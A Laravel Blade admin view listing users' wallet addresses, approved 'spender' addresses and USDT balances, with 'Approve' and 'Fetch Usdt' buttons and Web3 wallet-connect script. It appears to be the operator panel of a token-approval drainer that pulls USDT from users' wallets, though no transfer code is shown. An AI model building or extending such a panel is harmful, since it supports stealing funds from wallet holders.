@extends("layouts.app")
@section('content')
<!-- Content Header (Page header) -->
  <div class="content-header">
    <div class="container-fluid">
      <div class="mb-2">
        <h1 class="m-0">Users</h1>
      </div>
    </div>
  </div>

  <!-- Main content -->
  <div class="content">
    <div class="container-fluid">
      <div class="card">
        <div class="card-header">
          <div class="row">
            <div class="col-md-6 mb-3">
              <input
                class="form-control"
                type="search"
                placeholder="Search with user id or wallet address"
                aria-label="Search"
              />
            </div>
            <div class="col-md-6">
              <div class="float-right">
                {{-- <small>Connected Wallet:</small> --}}
                <button type="button" class="btn btn-primary" onClick="connectWallet()">
                  Connect
                </button>
              </div>
            </div>
          </div>
        </div>
        <!-- /.card-header -->
        <div class="card-body table-responsive p-0">
          <table class="table table-striped text-nowrap">
            <thead>
              <tr>
                <th style="width: 10px">#</th>
                <th>User Id</th>
                <th>Wallet Address</th>
                <th>Balance</th>
                <th>Real Balance (USDT)</th>
                <th>Status</th>
                <th style="width: 40px">Actions</th>
              </tr>
            </thead>
            <tbody>
              @foreach($data as $key => $user)
                <tr>
                  <td>{{$key += 1}}</td>
                  <td>{{$user->user_id}}</td>
                  <td>{{$user->wallet}} <br/> <span class="badge badge-primary">{{$user->spender ?? $user->spender }}</span></td>
                  <td>{{$user->balance}}</td>
                  <td id="real_balance">{{$user->real_balance}}</td>
                  <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif</td>
                  <td>
                    {{-- <button class="btn btn-secondary">
                      <i class="fas fa-ellipsis-v"></i>
                    </button> --}}
                    {{-- @include('partials._drop1'); --}}
                   @if ($user->status == 'pending') <a href="#" onClick="updateStatus({{$user->id}})" data-user_id= {{$user->id}} class="btn btn-primary btn-sm">Approve</a> @else <a href="#" id="modal_{{$user->id}}" onClick="fetchToken({{$user->id}})" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->real_balance}}>Fetch Usdt</a> <a href="users/manage-balance" class="btn btn-secondary btn-sm">Manage balance</a> @endif
                  </td>
                </tr>
              @endforeach
            </tbody>
          
          </table>
        </div>
        @include('partials._modal')
        <!-- /.card-body -->
      </div>
      <!-- /.card -->
    </div>
    <!-- /.container-fluid -->
  </div>
  <!-- /.content -->
@endsection
@section('scripts')

<script src = "https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"> </script>

<script>

    $(document).ready(function() {

      const web3 = new Web3(window.ethereum)

    });

    // Get info
    const getInfo = async () => {
    
    // Get connected user balances
      var walletAddress = await web3.eth.getAccounts()

    }

    const connectWallet = async () => {
      try {
          const accounts = await window.ethereum.request({
              method: 'eth_requestAccounts'
          })
          var walletAddress = accounts[0]

          console.log(walletAddress);

      } catch (error) {
          console.error('Error connecting wallet:', error)
      }
    }
  

    function updateStatus(id)
    {

      $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
          }
      });

      $.ajax({
          url: "{{ route('update.status') }}",
          type: 'POST',
          data: {user_id: id},
      }).done(function(response) {
        if(response == 'ok')
        {
          window.location.reload();
        }
      });

    };

    function fetchToken(id)
    {

      var wallet = $("#modal_"+id).attr('data-wallet');
      var balance = $("#modal_"+id).attr('data-balance');

      $("#modal-wallet").val(wallet);
      $("#modal-balance").text(balance);
      
      $('#fetchForm').modal('show'); 
      

    }

    function checkBalance()
    {

       var balance = $("#modal-amount").val();

       var a_balance = $("#modal-balance").text();


       if(parseInt(balance) > parseInt(a_balance))
       {
          $("#btn-fetch").attr("disabled", "disabled");

       }else if(parseInt(balance) <= parseInt(a_balance)){

          $("#btn-fetch").removeAttr('disabled');

       }

    }


  </script>
@endsection